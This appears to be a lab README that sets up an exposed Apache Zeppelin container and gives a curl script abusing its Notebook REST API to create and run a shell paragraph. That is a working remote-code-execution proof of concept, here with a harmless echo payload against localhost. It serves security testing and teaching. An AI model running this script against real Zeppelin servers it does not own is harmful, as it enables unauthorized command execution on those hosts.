# Apache Zeppelin RCE via Notebook API

1. Create docker container with Apache Zeppelin Notebook:
   ```bash
    docker build -t zeppelin-pyspark .
    ```
2. Run the following command to start Zeppelin Notebook
    ```bash
    docker run --name zeppelin-exposed-RCE --rm -p 8080:8080 zeppelin-pyspark
    ```
```bash
# 1. Create a new notebook and capture its ID
NOTEBOOK_ID=$(curl -X POST http://localhost:8080/api/notebook \
  -H "Content-Type: application/json" \
  -d '{"name": "Bash Command Example"}' | jq -r '.body')

echo "Created notebook with ID: $NOTEBOOK_ID"

# 2. Create a paragraph with our bash command
PARAGRAPH_ID=$(curl -X POST "http://localhost:8080/api/notebook/$NOTEBOOK_ID/paragraph" \
  -H "Content-Type: application/json" \
  -d '{"title": "Echo Command", "text": "%sh\necho '\''hello RCE'\''"}' | jq -r '.body')

echo "Created paragraph with ID: $PARAGRAPH_ID"

# 3. Run the paragraph
curl -X POST "http://localhost:8080/api/notebook/job/$NOTEBOOK_ID/$PARAGRAPH_ID"
echo "Executing paragraph..."

# 4. Wait a moment for execution to complete
sleep 2

# 5. Get the paragraph results to see the output
curl -X GET "http://localhost:8080/api/notebook/$NOTEBOOK_ID/paragraph/$PARAGRAPH_ID" | jq '.body.results.msg[0].data'

```

Reference:
- Zeppelin Notebook API: https://zeppelin.apache.org/docs/0.12.0/usage/rest_api/notebook#add-cron-job